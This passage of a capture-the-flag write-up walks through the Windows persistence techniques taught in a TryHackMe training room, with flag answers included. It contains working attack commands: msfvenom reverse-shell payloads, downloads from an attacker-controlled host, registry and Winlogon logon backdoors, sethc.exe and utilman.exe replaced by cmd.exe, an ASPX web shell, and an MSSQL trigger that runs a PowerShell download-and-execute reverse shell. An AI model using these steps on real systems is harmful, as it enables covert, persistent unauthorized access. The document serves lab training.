Before we get the flag we can finish this task first by loading RegEdit with  SYSTEM credentials so we can delete the SD for our new task.  Run Regedit using the pstools\PSExec64.exe and find the reg key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`, then delete the SD for our THM-TaskBackdoor task. Afterwards you can try to show it again and see that it is now not shown.
![[windowslocalpersist-25.jpg]]

Finally, we get the flag:
```shell
C:\Windows\system32>c:\flags\flag9.exe
c:\flags\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```

__Questions__

Insert flag9 here:
Answer: _THM{JUST_A_MATTER_OF_TIME}_



Task 6 - Logon Triggered Persistence
-----------------------------------------------------------

 Some actions taken by the user/victim might be bound to specific payloads. In this room we will look at executing a payload when the user logs in.

### Startup Folder

If we want to execute a program we can drop it into the following 2 folders:
Individial User: `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
All Users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

For this task, let's generate a reverse shell with msfvenom:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:

AttackBox:
```shell
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

PowerShell:
```powershell
PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

```shell
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

![[windowslocalpersist-19.png]]

And log back via RDP. You should immediately receive a connection back to your attacker's machine.

**NOTE:** Use your newly obtained shell to execute `C:\flags\flag10.exe` and get your flag!

### Run / RunOnce

In addition to the StartUp folder, there is a better place to put these so they are so noticeable to a layman.  You can put them in the Registry under the Run and RunOnce areas:

-   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

* Registry entries for `HKCU` are for the current user only
* Registry entries for `HKLM` are for all users.
* The `Run` keys are run every time a user logs on.
* The `RunOnce` keys are run only once.

For this next task, let's create a new reverse shell with msfvenom:
```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

Copy it to the victim's machine under `C:\Windows\`

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

**Note:** While in a real-world set-up you could use any name for your registry entry, for this task you are required to use `MyBackdoor` to receive the flag.

![[windowslocalpersist-20.png]]

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

**NOTE:** Using your newly obtained shell, execute `C:\flags\flag11.exe` to get a flag!

### Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

-   `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
-   `shell` points to the system's shell, which is usually `explorer.exe`.

![[windowslocalpersist-21.png]]

We have to be careful here as replacing something might break the logon sequence. 

Let's start by making another reverse shell with msfconsole:
```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

Next transfer our shell over to the victims PC as before and copy it to `C:\Windows\`
```shell
 wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

**Note:** While both `shell` and `Userinit` could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use `Userinit`.

![[windowslocalpersist-22.png]]

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

**NOTE:** Using your newly obtained shell, execute `C:\flags\flag12.exe` to get a flag!

### Logon Scripts

One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

Next transfer our shell over to the victims PC as before and copy it to `C:\Windows\`
```shell
 wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

![[windowslocalpersist-23.png]]

Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

**NOTE** 

Using your newly obtained shell, execute `C:\flags\flag13.exe` to get a flag!

__Questions__

First generate a payload with msfvenom:
```shell
kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4448 -f exe -o revshell.exe        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```

Now start a simple Python http server:
```shell
kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, pull the file from our victim PC:
```powershell
 wget http://tun0:4448/revshell.exe -O revshell.exe
```

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

```shell
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now we start a listener on our Attackbox:
```shell
 kali@kali  ~  nc -nlvp 4448
listening on [any] 4448 ...
```

Finally, we can log out of the Windows box and then log back in so that our script is triggered by our logon and after a few seconds we should get our shell:
```shell
connect to [tun0] from (UNKNOWN) [10.10.68.133] 49864
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Finally we can get our flag:
![[windowslocalpersist-26.jpg]]



Insert flag10 here:
Answer: _THM{NO_NO_AFTER_YOU}_

Next we will abuse the registry Run/RunOnce keys.

Generate a new msfvenom payload:
```shell
 kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4447 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```

Start a python simple webserver as before and pull the revshell.exe over to our Windows box. Then move it to `C:\Windows` directory.

Now edit the registery run keys as shown:
![[windowslocalpersist-28.jpg]]

Start a listener on the attackbox:
```shell
 kali@kali  ~  nc -nlvp 4447               
listening on [any] 4447 ...
```

Logout, Log back in and get the flag:
![[windowslocalpersist-29.jpg]]

Insert flag11 here:
Answer: _THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}_

Next we'll abuse the WinLogon as previously mentioned above. I'm going to skip posting the details for each step for brevity but will post relavent changes.

Make the revshell with msfvenom as before, upload it and then change the Winlogon / Userinit key as shown here:
![[windowslocalpersist-30.jpg]]

Start a listener, Logout, log back in and get your key:
```shell
 kali@kali  ~  nc -nlvp 4446
listening on [any] 4446 ...
connect to [tun0] from (UNKNOWN) [10.10.68.133] 50031
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>c:\flags\flag12.exe
c:\flags\flag12.exe
THM{I_INSIST_GO_FIRST}
```
Insert flag12 here:
Answer: _THM{I_INSIST_GO_FIRST}_

This last excercise, we will abuse the Environment Logon scripts.
Generate a new payload, upload to the Windows machine and Add the follow Windows Registery key for `UserInitMpLogonScript` and point it at your reverse shell:
![[windowslocalpersist-31.jpg]]

Then start a listener, logout and log back in again. You should get a reverse shell. Then you can get the flag:
```shell
 kali@kali  ~  nc -nlvp 4445
listening on [any] 4445 ...
connect to [tun0] from (UNKNOWN) [10.10.68.133] 50051
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>c:\flags\flag13.exe
c:\flags\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}
```
Insert flag13 here:
Answer: _THM{USER_TRIGGERED_PERSISTENCE_FTW}_


Task 7 - Backdooring the Login Screen / RDP
---------------------------------------------------------------------

If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

### Sticky Keys

When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![[windowslocalpersist-32.png]]

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

```shell
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu:
![[windowslocalpersist-33.png]]

You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen:

![[windowslocalpersist-34.png]]

**NOTE:** From your newly obtained terminal, execute `C:\flags\flag14.exe` to get your flag!

### Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![[windowslocalpersist-35.png]]

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

```shell
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button:
![[windowslocalpersist-36.png]]

And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges:
![[windowslocalpersist-37.png]]

**NOTE:** From your newly obtained terminal, execute `C:\flags\flag15.exe` to get your flag!

__Questions__

First we will bug the logon screen directly by replacing `sethc.exe` with `cmd.exe`.
![[windowslocalpersist-40.jpg]]

After locking the user screen, we can press `ENTER` 5 times and automatically login without a password.

Now we can get the flag:
![[windowslocalpersist-41.jpg]]

Insert flag14 here:
Answer: _THM{BREAKING_THROUGH_LOGIN}_

Next we will bug the Ease of Access function on the Logon screen again.
First we will replace `utilman.exe` with `cmd.exe`.


Now we can get the flag:
![[windowslocalpersist-42.jpg]]

Insert flag15 here:
Answer: _THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}_

Task 8 - Persisting Through Existing Services
---------------------------------------------------------------------

If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

### Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).

Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```shell
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:** Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL:

`http://MACHINE_IP/shell.aspx`

![[windowslocalpersist-38.png]]

**NOTE:** Use your web shell to execute `C:\flags\flag16.exe` to get your flag!

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

### Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the **New Query** button to open the query editor:

![[windowslocalpersist-39.png]]

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

**NOTE:** BE SURE TO Click the `Execute` button after each of these SQL Block Statements!

After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```sql
USE HRDB
```

Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

-   The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
-   The second connection will be a reverse shell on port 4454 back to our attacker machine.

```shell
user@AttackBox$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

```shell
user@AttackBox$ nc -lnvp 4454
Listening on 0.0.0.0 4454
```

With all that ready, let's navigate to `http://MACHINE_IP/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.

**NOTE:** Use your web shell to execute `C:\flags\flag17.exe` to get your flag!

__Questions__

For this task, we will use an ASP webshell. We can download one from here:
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

Setup a Simple http webserver with Python:
```shell
kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.218.252 - - [10/Feb/2023 08:48:54] "GET /shell.aspx HTTP/1.1" 200 -
```

From a PowerShell we download it:
![[windowslocalpersist-43.jpg]]
Then we move it:
```shell
C:\> move shell.aspx C:\inetpub\wwwroot\
```

We can also set the privs on the file so everyone can access it:
`C:\> icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F`

Now we can navigate to our site using the web browser at `http://10.10.218.252/shell.aspx` and then use the webshell to get the flag:
![[windowslocalpersist-44.jpg]]

Insert flag16 here:
Answer: _THM{EZ_WEB_PERSISTENCE}_

This time we will use the Database to implant a command to download a PowerShell script from our Attackbox, and run it when a user is inserted into the database running on the system.
We can run the Microsoft Database Studio Version 18 and enter the commands listed from above in this Task:
![[windowslocalpersist-45.jpg]]
Prepare the script called evilscript.ps1 as mentioned previously in this task and set a simple python webserver to host it. Be sure to change the ATTACKER_IP and PORT in the script. 
Then start a listener:

```shell
 kali@kali  ~  nc -nlvp 4445
listening on [any] 4445 ...
```

After visiting the site at `http://10.10.218.252/` we can enter a user into the db to trigger our script to run and get a reverse shell:
![[windowslocalpersist-46.jpg]]

Now we can get the flag:
```shell
listening on [any] 4445 ...
connect to [tun0] from (UNKNOWN) [10.10.218.252] 49993

PS C:\Windows\system32> C:\flags\flag17.exe
THM{I_LIVE_IN_YOUR_DATABASE}

PS C:\Windows\system32>
```

Insert flag17 here:
Answer: _THM{I_LIVE_IN_YOUR_DATABASE}_


Task 9 - Conclusion
----------------------------------

In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.

While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:

-   [Hexacorn - Windows Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
-   [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)   
    
-   [Oddvar Moe - Windows Persistence Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)  
-   [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)

__Questions__

Click and continue learning!
Answer: _None Needed_






